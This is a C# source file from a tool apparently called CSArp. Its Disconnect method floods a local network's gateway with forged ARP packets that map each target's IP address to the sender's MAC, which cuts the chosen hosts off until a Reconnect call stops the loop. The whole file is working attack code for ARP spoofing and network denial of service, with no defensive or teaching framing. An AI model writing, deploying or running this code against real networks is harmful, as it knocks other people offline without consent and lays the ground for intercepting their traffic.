using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;

namespace CSArp
{
    public static class DisconnectReconnect
    {
        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private static bool disengageflag = true;
        private static ICaptureDevice capturedevice;

        public static void Disconnect(Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, string interfacefriendlyname)
        {
            disengageflag = true;
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            capturedevice = (from devicex in CaptureDeviceList.Instance where ((SharpPcap.WinPcap.WinPcapDevice)devicex).Interface.FriendlyName == interfacefriendlyname select devicex).ToList()[0];

            foreach (var target in targetlist)
            {
                IPAddress myipaddress = ((SharpPcap.WinPcap.WinPcapDevice)capturedevice).Addresses[1].Addr.ipAddress; //possible critical point : Addresses[1] in hardcoding the index for obtaining ipv4 address
                ARPPacket arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, PhysicalAddress.Parse("00-00-00-00-00-00"), gatewayipaddress, capturedevice.MacAddress, target.Key);
                EthernetPacket ethernetpacketforgatewayrequest = new EthernetPacket(capturedevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
                new Thread(() =>
                {
                    disengageflag = false;
                    while (!disengageflag)
                    {
                        try
                        {
                            capturedevice.SendPacket(ethernetpacketforgatewayrequest);
                        }
                        catch(PcapException ex)
                        {

                        }
                    }
                }).Start();
                engagedclientlist.Add(target.Key, target.Value);
            };
        }

        public static void Reconnect()
        {
            disengageflag = true;
            engagedclientlist.Clear();
        }



    }

}
